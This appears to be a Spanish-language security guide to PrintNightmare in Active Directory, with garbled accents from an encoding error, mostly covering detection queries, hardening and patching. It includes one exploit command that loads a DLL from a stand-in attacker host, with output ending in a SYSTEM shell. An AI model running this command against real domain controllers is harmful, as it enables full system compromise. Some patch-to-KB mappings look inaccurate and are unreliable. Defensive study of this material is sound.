# üõë PrintNightmare en Active Directory

---

## üìù ¬øQu√© es PrintNightmare?

| Concepto      | Descripci√≥n                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definici√≥n**| PrintNightmare es un conjunto de vulnerabilidades cr√≠ticas en el servicio Print Spooler de Windows que permite ejecuci√≥n remota de c√≥digo y/o escalada de privilegios. |
| **Requisito** | El atacante debe tener acceso a la red y el Print Spooler debe estar activo en el sistema objetivo (servidores, estaciones, DCs).                |

---

## üõ†Ô∏è ¬øC√≥mo funciona el ataque?

| Fase             | Acci√≥n                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Conexi√≥n**     | El atacante se conecta al servicio Print Spooler v√≠a RPC/SMB, normalmente usando autenticaci√≥n de dominio.|
| **Carga**        | Carga un controlador de impresora (DLL) malicioso, abusando de la funci√≥n AddPrinterDriverEx.  |
| **Ejecuci√≥n**    | El controlador malicioso se ejecuta como SYSTEM, permitiendo RCE o escalada de privilegios.    |
| **Persistencia** | Puede usarse para mantener acceso privilegiado si no se parchea o desactiva el servicio.        |

---

## üíª Ejemplo pr√°ctico

```bash
# Uso de herramienta p√∫blica para explotar PrintNightmare:
python3 CVE-2021-34527.py <DC_IP> <'DOMAIN/user:pass'> '\\attacker\evil.dll'
```

```
[*] Connecting to the target Print Spooler service...
[*] Uploading malicious DLL via AddPrinterDriverEx...
[*] Triggering DLL execution as SYSTEM...
[+] SYSTEM shell obtained!
```

---

## üìä Detecci√≥n en logs y SIEM

| Campo clave                   | Descripci√≥n                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 808, 316, 307** | Eventos de creaci√≥n/carga de impresora o controlador en Print Service.      |
| **Proceso spoolsv.exe**       | Procesos hijackeados o DLLs cargadas desde rutas no est√°ndar.              |
| **Cambios en registro Print** | Modificaci√≥n de claves de registro asociadas a drivers de impresora.        |
| **Sysmon ID 7 / ID 1**        | Carga de DLLs sospechosas o ejecuci√≥n de comandos fuera de contexto.       |

### Query Splunk b√°sica

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=808 OR EventCode=316 OR EventCode=307)
| table _time, ComputerName, UserID, Param1, Param2
```

---

## üîé Queries completas para m√°s investigaci√≥n

### 1. Detecci√≥n de cargas de drivers desde rutas inusuales

```splunk
index=sysmon EventCode=7 Image="*spoolsv.exe" NOT (ImageLoaded="C:\\Windows\\System32\\*")
| table _time, Computer, Image, ImageLoaded, User
```

### 2. Creaci√≥n de impresoras/controladores fuera de horario o por usuarios no admins

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=316 OR EventCode=808)
| where UserID!="S-1-5-18"
| stats count by _time, ComputerName, UserID, Param1
```

### 3. Cambios en el registro Print Spooler

```splunk
index=sysmon EventCode=13 TargetObject="*Print*"
| table _time, Computer, TargetObject, Details, User
```

### 4. Ejecuci√≥n de comandos SYSTEM an√≥malos v√≠a spoolsv.exe

```splunk
index=sysmon EventCode=1 ParentImage="*spoolsv.exe"
| table _time, Computer, CommandLine, User
```

### 5. Tr√°fico RPC/SMB an√≥malo hacia spoolsv.exe

```splunk
index=network_logs dest_port=445 OR dest_port=139 process="spoolsv.exe"
| stats count by src_ip, dest_ip, process
| where count > 10
```

---

## ü¶æ Hardening y mitigaci√≥n

| Medida                                           | Descripci√≥n                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Parchear sistemas**                            | Instala los parches m√°s recientes de Microsoft para PrintNightmare y variantes.             |
| **Desactivar Print Spooler donde no sea necesario** | `Stop-Service Spooler` y `Set-Service Spooler -StartupType Disabled` en DCs y servidores cr√≠ticos.  |
| **Limitar instalaci√≥n de drivers**               | GPO: ‚ÄúAllow Print Spooler to accept client connections‚Äù y ‚ÄúPackage Point and Print - Approved Servers‚Äù. |
| **Monitorizaci√≥n continua**                      | Vigilar logs de PrintService y Sysmon para detectar cargas de DLLs/controladores an√≥malos.  |
| **Bloquear tr√°fico SMB innecesario**             | Restringir puertos 445/139 a lo m√≠nimo posible entre estaciones y servidores.               |
| **Auditor√≠a y alertas**                          | Configurar alertas SIEM para eventos Print Spooler cr√≠ticos y cargas de DLL no autorizadas. |

---

## üîß Parches y actualizaciones

| Parche/Update | Descripci√≥n                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5005010** | Windows 11 - Parche cr√≠tico principal para CVE-2021-34527 (PrintNightmare).                 |
| **KB5004945** | Windows 10 21H1/21H2 - Correcciones completas para todas las variantes de PrintNightmare.   |
| **KB5005033** | Windows Server 2022 - Parche esencial que corrige vulnerabilidades RCE en Print Spooler.    |
| **KB5004954** | Windows Server 2019 - Mitigaci√≥n completa de escalada de privilegios via Print Spooler.     |
| **KB5004946** | Windows Server 2016 - Correcciones de seguridad cr√≠ticas para Print Spooler.                |
| **KB5005573** | Windows Server 2012 R2 - Parche de seguridad para sistemas legacy afectados.               |

### Configuraciones de registro post-parche

```powershell
# Configurar restricciones de Point and Print (post-parche)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 0

# Habilitar logs detallados del Print Spooler
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print" -Name "LogLevel" -Value 2
```

### Verificaci√≥n de aplicaci√≥n de parches

```powershell
# Verificar que los parches est√©n instalados
Get-HotFix -Id KB5005010, KB5004945, KB5005033, KB5004954, KB5004946

# Verificar versi√≥n del Print Spooler
Get-WmiObject -Class Win32_SystemDriver | Where-Object {$_.Name -eq "spoolsv"}
```

### Actualizaciones cr√≠ticas de seguridad relacionadas

- **CVE-2021-34527**: PrintNightmare RCE principal (KB5005010, KB5004945)
- **CVE-2021-1675**: PrintNightmare escalada de privilegios local (KB5004945)
- **CVE-2021-34481**: Bypass de restricciones Point and Print (KB5005652)
- **CVE-2022-21999**: Nueva variante PrintNightmare (KB5010793)

### Validaci√≥n post-parche

```powershell
# Script para validar que la configuraci√≥n est√° segura
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
$restrictDrivers = Get-ItemProperty -Path $regPath -Name "RestrictDriverInstallationToAdministrators" -ErrorAction SilentlyContinue
if ($restrictDrivers.RestrictDriverInstallationToAdministrators -eq 1) {
    Write-Host "‚úì Restricci√≥n de drivers configurada correctamente" -ForegroundColor Green
} else {
    Write-Host "‚úó ALERTA: Restricci√≥n de drivers NO configurada" -ForegroundColor Red
}
```

---

## üßë‚Äçüíª ¬øC√≥mo revisar si Print Spooler est√° activo y expuesto?

```powershell
Get-Service -Name Spooler
Get-Printer
```
O comprobar puertos abiertos y sesiones RPC/SMB activas en DCs.

---

## üìö Referencias

- [Microsoft Security Advisory CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [PrintNightmare - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare)
- [Print Spooler Service Guidance - Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/print-spooler-security-guidance)
